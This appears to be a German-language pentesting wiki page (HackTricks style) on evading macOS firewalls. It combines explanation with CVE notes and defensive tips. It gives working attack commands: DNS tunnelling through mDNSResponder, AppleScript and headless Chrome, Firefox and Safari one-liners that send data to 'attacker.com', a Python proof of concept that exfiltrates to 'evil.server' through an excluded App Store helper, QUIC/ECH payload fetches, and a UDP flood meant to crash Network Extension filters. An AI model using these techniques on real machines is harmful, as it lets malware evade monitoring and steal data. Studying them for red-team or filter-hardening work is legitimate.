# Firewalls unter macOS umgehen

{{#include ../../banners/hacktricks-training.md}}

## Gefundene Techniken

Die folgenden Techniken funktionierten nachweislich bei einigen macOS-Firewall-Apps.

### Whitelist-Namen missbrauchen

- Zum Beispiel die Malware mit Namen bekannter macOS-Prozesse wie **`launchd`** aufrufen

### Synthetic Click

- Wenn die Firewall den Benutzer um Erlaubnis bittet, die Malware **auf „Allow“ klicken** lassen

### **Apple-signierte Binaries verwenden**

- Wie **`curl`**, aber auch andere wie **`whois`**

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** erlauben. iCloud könnte als C2 verwendet werden.

### Allgemeiner Bypass

Einige Ansätze zum Umgehen von Firewalls

### Erlaubten Traffic prüfen

Wenn man den erlaubten Traffic kennt, kann man potenziell in die Whitelist aufgenommene Domains oder Anwendungen identifizieren, die auf diese zugreifen dürfen
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Missbrauch von DNS

Unter macOS kommuniziert ein Prozess **nicht** selbst mit dem DNS-Server. Die Namensauflösung wird über **XPC** von **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) vermittelt, einem von Apple signierten System-Daemon. Daher verlässt jede Abfrage auf dem Rechner den Host als Traffic **von `mDNSResponder`** und nicht von dem Prozess, der sie angefordert hat. Firewalls vertrauen diesem Daemon daher meist bedingungslos — würde man ihn blockieren, wäre die Namensauflösung für das gesamte System unterbrochen.<sup>[[1]](#references)</sup>

Dadurch bleibt DNS ein offener Kanal, selbst wenn die Firewall die eigenen Sockets der Malware blockiert:<sup>[[1]](#references)</sup>

1. Die Malware versucht, eine Verbindung zu `evil.com` herzustellen. Ihre **eigene** ausgehende Verbindung wird von der Firewall geprüft und **blockiert**.
2. Stattdessen bittet die Malware `mDNSResponder`, `evil.com` über XPC **aufzulösen**.
3. Die Firewall prüft die daraus resultierende Abfrage, erkennt den vertrauenswürdigen, von Apple signierten Resolver als Ursprung und **erlaubt sie**.
4. Die Abfrage erreicht den DNS-Server — und wenn der Angreifer den autoritativen Server für `evil.com` betreibt, kontrolliert er beide Seiten des Austauschs.

Da der Angreifer diese Zone besitzt, ist keine „Verbindung“ erforderlich: Daten werden in den **abgefragten Labels** (z. B. `<encoded-chunk>.evil.com`) herausgeschleust, und Befehle kommen in den **Antwort-Records** (TXT, A, CNAME …) zurück. Dabei handelt es sich um klassisches DNS-Tunnelling über einen vollständig auf der Allowlist stehenden Prozess.

Jeder unprivilegierte Prozess kann den Daemon direkt steuern. Dies ist eine einfache Möglichkeit, zu bestätigen, dass der Pfad offen ist:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Über Browser-Apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Über Process Injections

Wenn du **Code in einen Process injizieren** kannst, der Verbindungen zu jedem Server herstellen darf, könntest du den Firewall-Schutz umgehen:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Aktuelle macOS-Firewall-Bypass-Schwachstellen (2023-2025)

### Bypass des Web content filter (Screen Time) – **CVE-2024-44206**
Im Juli 2024 hat Apple einen kritischen Bug in Safari/WebKit gepatcht, der den systemweiten „Web content filter“ beschädigte, der von der elterlichen Kontrolle durch Screen Time verwendet wird.
Eine speziell erstellte URI (zum Beispiel mit doppelt URL-encodiertem „://“) wird von der Screen-Time-ACL nicht erkannt, aber von WebKit akzeptiert, sodass die Anfrage ungefiltert gesendet wird. Jeder Process, der eine URL öffnen kann (einschließlich sandboxed oder unsigned Code), kann dadurch Domains erreichen, die vom Benutzer oder einem MDM-Profil ausdrücklich blockiert wurden.<sup>[[2]](#references)</sup>

Praktischer Test (ungepatchtes System):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Fehler bei der Reihenfolge von Packet-Filter-(PF-)Regeln in frühen macOS-14-„Sonoma“-Versionen
Während des macOS-14-Betazyklus führte Apple eine Regression im userspace wrapper um **`pfctl`** ein.
Regeln, die mit dem Schlüsselwort `quick` hinzugefügt wurden (von vielen VPN kill-switches verwendet), wurden stillschweigend ignoriert. Dadurch kam es zu traffic leaks, selbst wenn eine VPN-/Firewall-GUI *blocked* meldete. Der Fehler wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (Build 23A344) behoben.<sup>[[6]](#references)</sup>

Schneller leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Missbrauch von Apple-signierten helper services (legacy – vor macOS 11.2)
Vor macOS 11.2 erlaubte die **`ContentFilterExclusionList`** etwa 50 Apple-Binaries wie **`nsurlsessiond`** und den App Store, sämtliche mit dem Network Extension framework implementierten Socket-Filter-Firewalls (LuLu, Little Snitch usw.) zu umgehen.
Malware konnte einfach einen ausgeschlossenen Prozess spawn oder Code in diesen injecten und den eigenen Traffic über den bereits erlaubten Socket tunneln. Apple entfernte die Exclusion List in macOS 11.2 vollständig, aber die Technik ist weiterhin auf Systemen relevant, die nicht aktualisiert werden können.<sup>[[3]](#references)</sup>

Beispiel für einen Proof-of-Concept (vor 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH zum Umgehen von Network Extension-Domainfiltern (macOS 12+)
NEFilter Packet/Data Providers stützen sich auf SNI/ALPN im TLS ClientHello. Mit **HTTP/3 über QUIC (UDP/443)** und **Encrypted Client Hello (ECH)** bleibt der SNI verschlüsselt, NetExt kann den Datenstrom nicht analysieren, und Hostname-Regeln schlagen häufig als **fail-open** fehl, sodass Malware blockierte Domains erreichen kann, ohne DNS zu verwenden.<sup>[[5]](#references)</sup>

Minimaler PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Wenn QUIC/ECH weiterhin aktiviert ist, stellt dies einen einfachen Weg dar, die Hostname-Filterung zu umgehen.

### Instabilität der macOS-15-„Sequoia“-Network-Extension (2024–2025)
Frühe Builds von 15.0/15.1 bringen Filter von Drittanbietern für die **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne usw.) zum Absturz. Wenn der Filter neu gestartet wird, verwirft macOS seine Flow-Regeln, und viele Produkte arbeiten bei einem Ausfall standardmäßig offen („fail-open“). Das Überfluten des Filters mit Tausenden kurzen UDP-Flows (oder das Erzwingen von QUIC/ECH) kann den Absturz wiederholt auslösen und ein Zeitfenster für C2/Exfiltration schaffen, während die GUI weiterhin behauptet, dass die Firewall ausgeführt wird.<sup>[[4]](#references)</sup>

Schnelle Reproduktion (sichere Labor-Maschine):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Tipps für moderne macOS-Systeme

1. Untersuche die aktuellen PF-Regeln, die GUI-Firewalls generieren:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Ermittle Binaries, die bereits das *outgoing-network*-Entitlement besitzen (nützlich für piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registriere programmgesteuert deinen eigenen Network Extension Content Filter in Objective-C/Swift.
Ein minimales rootless PoC, das Pakete an einen lokalen Socket weiterleitet, ist im Quellcode von Patrick Wardles **LuLu** verfügbar.

## Referenzen

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple-Web-Content-Filter-Bypass ermöglicht uneingeschränkten Zugriff auf blockierte Inhalte (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple entfernt macOS-Funktion, die Apps das Umgehen der Firewall-Sicherheit ermöglichte - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity-Produkte fallen nach dem macOS-Sequoia-Update aus - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Verwende den Netzwerkschutz, um macOS-Verbindungen zu schädlichen Websites zu verhindern - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [macOS-14-Sonoma-Firewall-Bug behoben! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
